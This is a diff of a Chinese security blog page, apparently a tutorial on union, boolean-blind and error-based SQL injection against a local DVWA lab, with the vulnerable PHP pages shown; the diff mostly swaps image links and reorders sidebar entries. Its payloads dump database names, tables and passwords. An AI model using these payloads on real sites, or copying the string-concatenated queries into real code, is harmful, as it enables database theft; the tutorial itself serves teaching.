@@ -462,71 +462,71 @@ height:50vh;
 <li>XFF注入</li>
 </ol>
 <h4 id="Union注入"><a href="#Union注入" class="headerlink" title="Union注入"></a>Union注入</h4><p>注入测试地址<a href="http://192.168.23.134/union/union.php?id=1" target="_blank" rel="noopener">http://192.168.23.134/union/union.php?id=1</a></p>
-<p>访问该网站页面返回的结果如图所示<br><img src="https://img-blog.csdnimg.cn/20190228165019944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>在url后添加一个单引号，再次访问，如下图所示，页面返回的结果与id=1的结果不同。<br><img src="https://img-blog.csdnimg.cn/20190228165051375.jpg" alt="在这里插入图片描述"><br>访问id=1 and 1=1,由于and 1=1为真，所以页面应返回与id=1相同的结果,如图所示，访问id=1 and 1=2 由于and 1=2为假，所以页面应返回与id=1不同的结果，如图1.2所示。<br><img src="https://img-blog.csdnimg.cn/20190228165112185.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="图1.1"><br>注：这里的加号代替了空格(url编码)<br><img src="https://img-blog.csdnimg.cn/20190228165248805.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>                                                                  图1.2</p>
-<p>  因此可以得出此网站可能存在sql注入的结论，接着使用order by 1-99语句查询该数据表的字段数量，可以理解为order by=1-99，如访问id=1 order by 8 返回的是与id=1相同的结果，如图2.1所示。访问id=1 order by 9,返回的与id=1的结果不同，则字段数为8，如图2.2.<br><img src="https://img-blog.csdnimg.cn/20190228165808305.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>访问该网站页面返回的结果如图所示<br><img src="https://www.fuzzer.xyz/images/SQL/clip_image001.png" alt="在这里插入图片描述"></p>
+<p>在url后添加一个单引号，再次访问，如下图所示，页面返回的结果与id=1的结果不同。<br><img src="https://www.fuzzer.xyz/images/SQL/clip_image003.png" alt="在这里插入图片描述"><br>访问id=1 and 1=1,由于and 1=1为真，所以页面应返回与id=1相同的结果,如图所示，访问id=1 and 1=2 由于and 1=2为假，所以页面应返回与id=1不同的结果，如图1.2所示。<br><img src="https://www.fuzzer.xyz/images/SQL/clip_image005.png" alt="图1.1"><br>注：这里的加号代替了空格(url编码)<br><img src="https://www.fuzzer.xyz/images/SQL/clip_image007.png" alt="在这里插入图片描述"><br>                                                                  图1.2</p>
+<p>  因此可以得出此网站可能存在sql注入的结论，接着使用order by 1-99语句查询该数据表的字段数量，可以理解为order by=1-99，如访问id=1 order by 8 返回的是与id=1相同的结果，如图2.1所示。访问id=1 order by 9,返回的与id=1的结果不同，则字段数为8，如图2.2.<br><img src="https://www.fuzzer.xyz/images/SQL/clip_image009.png" alt="在这里插入图片描述"></p>
 <p>​                                                                                        图2.1</p>
-<p><img src="https://img-blog.csdnimg.cn/20190228165825473.jpg" alt="在这里插入图片描述"></p>
+<p><img src="https://www.fuzzer.xyz/images/SQL/clip_image011.png" alt="在这里插入图片描述"></p>
 <p>​                                                                                         图2.2</p>
 <p>  接下来使用union注入，且通过order by 查询结果，得字段数为8，所以union注入的语句如下所示</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20190228165852264.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>  我们将id值设为-1，只让服务器返回union select的结果，因为数据库里没有id=-1的数据。如下图：<br><img src="https://img-blog.csdnimg.cn/2019022816591669.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>返回的结果是4，5，意味着在union select 1,2,3,4,5,6,7,8中，4和5的位置可以输入sql语句。接下来我们在        4的位置使用database()查询当前数据库名访问</p>
+<p><img src="https://www.fuzzer.xyz/images/SQL/clip_image013.png" alt="在这里插入图片描述"></p>
+<p>  我们将id值设为-1，只让服务器返回union select的结果，因为数据库里没有id=-1的数据。如下图：<br><img src="https://www.fuzzer.xyz/images/SQL/clip_image016.jpg" alt="在这里插入图片描述"><br>返回的结果是4，5，意味着在union select 1,2,3,4,5,6,7,8中，4和5的位置可以输入sql语句。接下来我们在        4的位置使用database()查询当前数据库名访问</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>+union+select+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,database(),<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span></span><br></pre></td></tr></table></figure>
-<p>页面成功返回数据信息，如图所示<br><img src="https://img-blog.csdnimg.cn/20190228165942636.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>得到数据库名后，接下来查询表名<br><img src="https://img-blog.csdnimg.cn/20190228170004606.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20190228170022290.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>页面成功返回数据信息，如图所示<br><img src="https://www.fuzzer.xyz/images/SQL/clip_image017.png" alt="在这里插入图片描述"></p>
+<p>得到数据库名后，接下来查询表名<br><img src="https://www.fuzzer.xyz/images/SQL/clip_image019.png" alt="在这里插入图片描述"></p>
+<p><img src="https://www.fuzzer.xyz/images/SQL/clip_image021.png" alt="在这里插入图片描述"></p>
 <p>以此类推，可以查询所有的表名，这里我们用users表，查询字段名</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.clumns where table_schema=’dvwa’ <span class="keyword">and</span> table_name=’users’ limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20190228170044324.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://www.fuzzer.xyz/images/SQL/clip_image023.png" alt="在这里插入图片描述"></p>
 <p>可知第一个字段为user_id,以此类推用limit n,1查询出所有字段名</p>
-<p><img src="https://img-blog.csdnimg.cn/20190228170103732.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20190228170117838.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://www.fuzzer.xyz/images/SQL/clip_image025.png" alt="在这里插入图片描述"></p>
+<p><img src="https://www.fuzzer.xyz/images/SQL/clip_image057.png" alt="在这里插入图片描述"></p>
 <p>得出字段名后，我们还要dump出字段值以password字段为例</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select password from dvwa.users limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20190228170130978.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://www.fuzzer.xyz/images/SQL/clip_image029.png" alt="在这里插入图片描述"></p>
 <p>假如我们利用5显示位，可以将密码对应的姓名也打印出来</p>
-<p><img src="https://img-blog.csdnimg.cn/20190228170146468.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://www.fuzzer.xyz/images/SQL/clip_image031.png" alt="在这里插入图片描述"></p>
 <h4 id="Union注入代码分析"><a href="#Union注入代码分析" class="headerlink" title="Union注入代码分析"></a>Union注入代码分析</h4><p>​       在union注入页面中，程序获取GET参数ID，将ID拼接到SQL语句中，在数据库中查询参数ID对应的内容，然后将第一条查询结果中的username和address输出到页面上，由于是将数据输出到页面上的，所以可以利用union语句查询其他数据，代码如下</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$con=mysqli_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"dvwa"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_error()</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"连接失败: "</span> . mysqli_connect_error();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line">$result = mysqli_query($con,<span class="string">"select * from users where `user_id`="</span>.$id);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>($row = mysqli_fetch_array($result))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $row[<span class="string">'user'</span>] . <span class="string">" "</span> . $row[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <hr>
 <h4 id="Boolean注入"><a href="#Boolean注入" class="headerlink" title="Boolean注入"></a>Boolean注入</h4><p>注入测试地址：<a href="http://192.168.23.134/boolean/boolean.php?id=1" target="_blank" rel="noopener">http://192.168.23.134/boolean/boolean.php?id=1</a></p>
-<p>访问该网址页面返回yes，如图所示<br><img src="https://img-blog.csdnimg.cn/20190228170206530.jpg" alt="在这里插入图片描述"></p>
+<p>访问该网址页面返回yes，如图所示<br><img src="https://www.fuzzer.xyz/images/SQL/clip_image033.png" alt="在这里插入图片描述"></p>
 <p>加上单引号后，页面返回no</p>
-<p><img src="https://img-blog.csdnimg.cn/20190228170225880.jpg" alt="在这里插入图片描述"></p>
+<p><img src="https://www.fuzzer.xyz/images/SQL/clip_image035.png" alt="在这里插入图片描述"></p>
 <p>虽然这里存在报错注入，但目前暂不考虑，输入其它的id值，只返回yes和no。由此可以判断，页面只返回yes和no，不返回数据库中的数据，所以此处不可union注入。此处利用Boolean注入。Boolean注入是指构造SQL判断语句，通过查看页面的返回结果来推测哪些sql判断条件是成立，以此获取数据库数据。我们先判断数据库名的长度。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘ <span class="keyword">and</span> length(database())&gt;=<span class="number">1</span>--+</span><br></pre></td></tr></table></figure>
-<p>​    有单引号，所以需要注释符来注释。1的位置上可以是任意数字，如‘ and length(database())&gt;=4–+和‘ and length(database())&gt;=5–+,判断数据库长度，如图所示<br><img src="https://img-blog.csdnimg.cn/20190228170245464.jpg" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190228170310735.jpg" alt="在这里插入图片描述"></p>
+<p>​    有单引号，所以需要注释符来注释。1的位置上可以是任意数字，如‘ and length(database())&gt;=4–+和‘ and length(database())&gt;=5–+,判断数据库长度，如图所示<br><img src="https://www.fuzzer.xyz/images/SQL/clip_image037.png" alt="在这里插入图片描述"><br><img src="https://www.fuzzer.xyz/images/SQL/clip_image039.png" alt="在这里插入图片描述"></p>
 <p>可以判断出数据库名长度为4。</p>
 <p>​    接着，使用逐字符判断的方式获取数据库库名。数据库库名的范围一般在a~z,0~9之内，可能还有一些特殊字符，这里的字符不区分大小写。逐字符判断的SQL语句为：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘ <span class="keyword">and</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)=’d’--+</span><br></pre></td></tr></table></figure>
 <p>​    substr是截取的意思，其意思是截取database()的值，从第一个字符开始，每次只返回一个。</p>
-<p>​    substr的用法跟limit的有区别，需要注意。Limit是从0开始排序，而这里是从1开始排序。可以使用burp的爆破功能爆破其中的d值，如图所示，当值为d时页面返回yes，其它值返回no，因此判断数据库名第一位为d<br><img src="https://img-blog.csdnimg.cn/20190228170332739.jpg" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190228170358750.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190228170417105.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>​    substr的用法跟limit的有区别，需要注意。Limit是从0开始排序，而这里是从1开始排序。可以使用burp的爆破功能爆破其中的d值，如图所示，当值为d时页面返回yes，其它值返回no，因此判断数据库名第一位为d<br><img src="https://www.fuzzer.xyz/images/SQL/clip_image041.png" alt="在这里插入图片描述"><br><img src="https://www.fuzzer.xyz/images/SQL/clip_image043.png" alt="在这里插入图片描述"><br><img src="https://www.fuzzer.xyz/images/SQL/clip_image045.png" alt="在这里插入图片描述"></p>
 <p>逐字符爆破可以得出数据库名为dvwa。</p>
 <p>​    其实还可以使用ASCII码的字符进行查询，在mysql中ASCII转换的函数为ord，则可以进行逐字符爆破。ASCII码共有127个对应码，因此我们把burp的payload的范围设为0~127。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘ <span class="keyword">and</span> ord(substr(database(),<span class="number">1</span>,<span class="number">1</span>))&gt;=<span class="number">100</span>--+</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20190228170435220.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://www.fuzzer.xyz/images/SQL/clip_image047.png" alt="在这里插入图片描述"></p>
 <p>d的ascii对应的为100，所以第一个字符为d。</p>
 <p>接下来爆破表名，同样利用burp爆破。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘ <span class="keyword">and</span> substr((select table_name from information_schema.tables where table_schema=’dvwa’ limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)=’u’--+</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20190228170500392.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://www.fuzzer.xyz/images/SQL/clip_image049.png" alt="在这里插入图片描述"></p>
 <p>这里爆破出第二个表的第一个字符为u,以此类推，就可以查询出所有的表名与字段名。</p>
 <h4 id="Boolean注入代码分析"><a href="#Boolean注入代码分析" class="headerlink" title="Boolean注入代码分析"></a>Boolean注入代码分析</h4><p>​    在Boolean注入页面中程序先获取GET参数ID,通过preg_match判断其中是否存在union/sleep/benchmark等危险字符。然后将参数ID拼接到SQL语句,从数据库查询，如果有结果，则返回yes，否则返回no。当访问该页面时，代码根据数据库查询的结果返回yes或no,而不返回数据库中的任何数据，所以页面上只会显示yes或no,代码如下。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$con=mysqli_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"dvwa"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_errno())</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"连接失败: "</span> . mysqli_connect_error();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/union|sleep|benchmark/i"</span>, $id)) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">"no"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result = mysqli_query($con,<span class="string">"select * from users where `user_id`='"</span>.$id.<span class="string">"'"</span>);</span><br><span class="line"></span><br><span class="line">$row = mysqli_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($row) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">"yes"</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">"no"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <hr>
 <h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>注入测试网址：192.168.23.134/error/error.php?username=1</p>
 <p>加上单引号后会报错。</p>
-<p><img src="https://img-blog.csdnimg.cn/20190228170524864.jpg" alt="在这里插入图片描述"></p>
+<p><img src="https://www.fuzzer.xyz/images/SQL/clip_image051.png" alt="在这里插入图片描述"></p>
 <p>通过页面返回结果可以看出，程序直接将错误信息输出到了页面上，所以利用报错注入获取数据。报错注入有多种方式，此处利用函数updataxml()SQL语句获取user()的值</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘ <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select user()),<span class="number">0x7e</span>),<span class="number">1</span>)--+</span><br></pre></td></tr></table></figure>
 <p>其中0x7e是ASCII编码，解码结果为~,concat函数用于连接字符串。</p>
-<p><img src="https://img-blog.csdnimg.cn/2019022817054374.jpg" alt="在这里插入图片描述"></p>
+<p><img src="https://www.fuzzer.xyz/images/SQL/clip_image053.png" alt="在这里插入图片描述"></p>
 <p>然后获取当前的数据库名</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘ <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select database()),<span class="number">0x7e</span>),<span class="number">1</span>)--+</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20190228170606206.jpg" alt="在这里插入图片描述"></p>
+<p><img src="https://www.fuzzer.xyz/images/SQL/clip_image055.png" alt="在这里插入图片描述"></p>
 <p>接下来查询表名</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘ <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select table_name from information_schema.tables where table_schema=’dvwa’ limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)--+</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20190228170625945.jpg" alt="在这里插入图片描述"></p>
+<p><img src="https://www.fuzzer.xyz/images/SQL/clip_image057.png" alt="在这里插入图片描述"></p>
 <h4 id="报错注入代码分析"><a href="#报错注入代码分析" class="headerlink" title="报错注入代码分析"></a>报错注入代码分析</h4><p>  在报错注入页面中，程序获取GET参数username后，将username拼接到SQL语句中，然后到数据库查询，如果执行成功，就输出ok;如果出错，则通过mysqli_error($con)将错误信息输出到页面。代码如下</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$con=mysqli_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"dvwa"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_errno())</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"连接失败: "</span> . mysqli_connect_error();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = $_GET[<span class="string">'username'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($result = mysqli_query($con,<span class="string">"select * from users where `first_name`='"</span>.$username.<span class="string">"'"</span>))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"ok"</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> mysqli_error($con);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>  输入username=1’时，SQL语句为select * from users where ‘username’=’1’’会因为多了一个单引号而报错。利用这种错误回显，我们可以通过floor(),updatexml()等函数将要查询的内容输出到页面上。</p>
@@ -574,8 +574,8 @@ height:50vh;
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/2019/03/01/SQL注入回顾篇(四)/" title="SQL注入回顾篇(4)">
-                    <div class="prevTitle">SQL注入回顾篇(4)</div>
+                <a href="/2019/03/01/SQL注入回顾篇(三)/" title="SQL注入回顾篇(3)">
+                    <div class="prevTitle">SQL注入回顾篇(3)</div>
                 </a>
             
         </li>
@@ -1047,10 +1047,6 @@ top:50vh;
     
     
     
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 26
@@ -1159,22 +1155,22 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQL注入回顾篇(二)/">SQL注入回顾篇(2)</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQL注入回顾篇(四)/">SQL注入回顾篇(4)</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQL注入回顾篇(三)/">SQL注入回顾篇(3)</a>
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQL注入回顾篇(二)/">SQL注入回顾篇(2)</a>
         </li>
     
     
         <li class="archive-post-item">
             <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQL注入回顾篇(一)/">SQL注入回顾篇(1)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQL注入回顾篇(三)/">SQL注入回顾篇(3)</a>
         </li>
     
     
@@ -1211,35 +1207,35 @@ top:50vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="工具"><span class="iconfont-archer">&#xe606;</span>工具</span>
-    
         <span class="sidebar-tag-name" data-tags="fuzz 脚本"><span class="iconfont-archer">&#xe606;</span>fuzz 脚本</span>
     
         <span class="sidebar-tag-name" data-tags="php代码审计"><span class="iconfont-archer">&#xe606;</span>php代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="工具"><span class="iconfont-archer">&#xe606;</span>工具</span>
     
         <span class="sidebar-tag-name" data-tags="系统"><span class="iconfont-archer">&#xe606;</span>系统</span>
     
         <span class="sidebar-tag-name" data-tags="时光"><span class="iconfont-archer">&#xe606;</span>时光</span>
     
+        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
+    
         <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
     
         <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
     
-        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
+        <span class="sidebar-tag-name" data-tags="fuzz 工具"><span class="iconfont-archer">&#xe606;</span>fuzz 工具</span>
     
         <span class="sidebar-tag-name" data-tags="curl"><span class="iconfont-archer">&#xe606;</span>curl</span>
     
-        <span class="sidebar-tag-name" data-tags="phar反序列化"><span class="iconfont-archer">&#xe606;</span>phar反序列化</span>
-    
         <span class="sidebar-tag-name" data-tags="sql注入，攻防"><span class="iconfont-archer">&#xe606;</span>sql注入，攻防</span>
+    
+        <span class="sidebar-tag-name" data-tags="phar反序列化"><span class="iconfont-archer">&#xe606;</span>phar反序列化</span>
     
         <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
     
         <span class="sidebar-tag-name" data-tags="fuzz"><span class="iconfont-archer">&#xe606;</span>fuzz</span>
     
